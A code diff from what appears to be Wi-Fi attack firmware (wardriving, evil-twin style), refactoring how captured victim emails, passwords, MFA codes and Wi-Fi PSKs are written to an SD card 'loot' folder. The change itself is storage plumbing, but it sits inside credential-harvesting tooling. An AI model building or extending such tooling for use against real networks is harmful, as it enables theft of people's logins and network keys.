@@ -14,6 +14,7 @@
 #include "wardriving.h"
 #include "gps_module.h"
 #include "spi_manager.h"
+#include "services/StorageService.h"
 #include <SD.h>
 #include <Preferences.h>
 #include <arduinoFFT.h>
@@ -5536,13 +5537,11 @@ static void saveCredential(const char* email, const char* password, const char* 
 
     // Append to SD card for persistent storage
     spiDeselect();
-    bool sdOk = SD.begin(SD_CS);
-    if (!sdOk) {
-        SPI.begin(18, 19, 23, SD_CS);
-        sdOk = SD.begin(SD_CS, SPI, 4000000);
-    }
+    bool sdOk = globalStorageService().begin() == StorageCode::Ok;
     if (sdOk) {
-        File f = SD.open("/creds.txt", FILE_APPEND);
+        globalStorageService().ensureDirectory("/loot");
+        globalStorageService().ensureDirectory("/loot/credentials");
+        File f = SD.open("/loot/credentials/creds.txt", FILE_APPEND);
         if (f) {
             f.printf("%s | %s | %s | %s\n",
                      customSSID,
@@ -5551,7 +5550,6 @@ static void saveCredential(const char* email, const char* password, const char* 
                      mfa ? mfa : "");
             f.close();
         }
-        SD.end();
     }
     spiDeselect();
 
@@ -5577,13 +5575,11 @@ static void updateLastCredMFA(const char* mfa) {
 // Save full PSK to SD card (no truncation — up to 63 chars)
 static void savePSKtoSD(const char* psk) {
     spiDeselect();
-    bool sdOk = SD.begin(SD_CS);
-    if (!sdOk) {
-        SPI.begin(18, 19, 23, SD_CS);
-        sdOk = SD.begin(SD_CS, SPI, 4000000);
-    }
+    bool sdOk = globalStorageService().begin() == StorageCode::Ok;
     if (sdOk) {
-        File f = SD.open("/creds.txt", FILE_APPEND);
+        globalStorageService().ensureDirectory("/loot");
+        globalStorageService().ensureDirectory("/loot/credentials");
+        File f = SD.open("/loot/credentials/creds.txt", FILE_APPEND);
         if (f) {
             f.printf("[PSK] %s | %s | %02X:%02X:%02X:%02X:%02X:%02X | CH%d\n",
                      customSSID,
@@ -5593,7 +5589,6 @@ static void savePSKtoSD(const char* psk) {
                      targetChannel);
             f.close();
         }
-        SD.end();
     }
     spiDeselect();
 }
